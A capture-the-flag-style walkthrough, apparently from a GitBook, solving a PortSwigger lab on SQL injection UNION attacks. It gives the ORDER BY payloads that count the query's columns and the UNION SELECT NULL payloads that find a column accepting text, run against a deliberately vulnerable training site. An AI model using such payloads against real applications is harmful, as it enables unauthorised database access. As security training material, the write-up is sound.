# Lab: SQL injection UNION attack, finding a column containing text

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a [previous lab](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns). The next step is to identify a column that is compatible with string data.

The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.

***

Let's Start !!

First We Visit The Website !!

<figure><img src="../../../.gitbook/assets/image (534).png" alt=""><figcaption></figcaption></figure>

We Try To Inject Single Quote `'` To Break The Backend Query !!

<figure><img src="../../../.gitbook/assets/image (535).png" alt=""><figcaption></figcaption></figure>

When We Inject `'--` They Fix The Query and Give No Error ,In SQL `--` Refer To Comment Out In Code !!

<figure><img src="../../../.gitbook/assets/image (536).png" alt=""><figcaption></figcaption></figure>

**Finding Number of Columns**

**Method – ORDER BY**

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 4--
```

If `ORDER BY 4` fails, query has 3 columns.

<figure><img src="../../../.gitbook/assets/image (537).png" alt=""><figcaption></figcaption></figure>

That `ORDER BY 4` fails, query has 3 columns.

<figure><img src="../../../.gitbook/assets/image (538).png" alt=""><figcaption></figcaption></figure>

Now Let's Find The Which Column is in We Use String !!

We Use NULL and Try Three Combination If One Of The Payload Is Not Give Error It's Mean We Use String In This Columns !!

```
' UNION SELECT NULL,NULL,'b'--
' UNION SELECT NULL,'b',NULL--
' UNION SELECT 'b',NULL,NULL--
```

<figure><img src="../../../.gitbook/assets/image (539).png" alt=""><figcaption></figcaption></figure>

Our Second Combination Don't Give Error It's Mean In This Column We Use String !!

```
' UNION SELECT NULL,'b',NULL--
```

<figure><img src="../../../.gitbook/assets/image (540).png" alt=""><figcaption></figcaption></figure>

We Use Given String To Solve The This Lab !!

```
' UNION SELECT NULL,'4jczk2',NULL--
```

<figure><img src="../../../.gitbook/assets/image (541).png" alt=""><figcaption></figcaption></figure>
